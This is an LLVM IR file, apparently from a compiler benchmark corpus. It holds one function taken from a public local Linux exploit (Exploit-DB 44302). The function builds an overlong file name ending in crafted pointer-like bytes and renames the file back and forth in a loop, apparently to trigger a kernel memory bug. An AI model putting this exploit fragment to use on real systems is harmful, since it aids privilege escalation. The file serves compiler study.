; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_44302.c_callrename.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_44302.c_callrename.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.callrename.next_ptr = private unnamed_addr constant [8 x i8] c"0\FF\FF1\FF\FF\FF\FF", align 1
@.str = private unnamed_addr constant [12 x i8] c"test_dir/%s\00", align 1
@orig_name = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [16 x i8] c"alloc_len : %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"test_dir/%s%s%s\00", align 1
@longname_padding = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [15 x i8] c"longname=\22%s\22\0A\00", align 1
@stop = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [8 x i8] c"rename1\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"rename2\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"callrename done.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @callrename(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca [1024 x i8], align 16
  %9 = alloca [1024 x i8], align 16
  %10 = alloca [8 x i8], align 1
  %11 = alloca [8 x i8], align 1
  store i8* %0, i8** %3, align 8
  store i8 0, i8* %7, align 1
  %12 = bitcast [8 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %12, i8* align 1 getelementptr inbounds ([8 x i8], [8 x i8]* @__const.callrename.next_ptr, i32 0, i32 0), i64 8, i1 false)
  %13 = bitcast [8 x i8]* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 1 %13, i8 0, i64 8, i1 false)
  %14 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %15 = load i8*, i8** @orig_name, align 8
  %16 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %14, i32 1024, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i8* %15)
  %17 = load i8*, i8** @orig_name, align 8
  %18 = call i32 @strlen(i8* %17)
  %19 = add nsw i32 48, %18
  %20 = add nsw i32 %19, 1
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0), i32 %20)
  %22 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %23 = load i8*, i8** @longname_padding, align 8
  %24 = getelementptr inbounds [8 x i8], [8 x i8]* %10, i64 0, i64 0
  %25 = getelementptr inbounds [8 x i8], [8 x i8]* %11, i64 0, i64 0
  %26 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %22, i32 1024, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i8* %23, i8* %24, i8* %25)
  %27 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0), i8* %27)
  store i32 0, i32* %4, align 4
  br label %29

29:                                               ; preds = %53, %1
  %30 = load i32, i32* %4, align 4
  %31 = icmp slt i32 %30, 10000
  br i1 %31, label %32, label %36

32:                                               ; preds = %29
  %33 = load i32, i32* @stop, align 4
  %34 = icmp ne i32 %33, 0
  %35 = xor i1 %34, true
  br label %36

36:                                               ; preds = %32, %29
  %37 = phi i1 [ false, %29 ], [ %35, %32 ]
  br i1 %37, label %38, label %56

38:                                               ; preds = %36
  %39 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %40 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %41 = call i64 @rename(i8* %39, i8* %40)
  %42 = icmp slt i64 %41, 0
  br i1 %42, label %43, label %45

43:                                               ; preds = %38
  %44 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  br label %45

45:                                               ; preds = %43, %38
  %46 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %47 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %48 = call i64 @rename(i8* %46, i8* %47)
  %49 = icmp slt i64 %48, 0
  br i1 %49, label %50, label %52

50:                                               ; preds = %45
  %51 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  br label %52

52:                                               ; preds = %50, %45
  br label %53

53:                                               ; preds = %52
  %54 = load i32, i32* %4, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %4, align 4
  br label %29

56:                                               ; preds = %36
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0))
  %58 = load i8*, i8** %2, align 8
  ret i8* %58
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, ...) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @rename(i8*, i8*) #2

declare dso_local i32 @perror(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
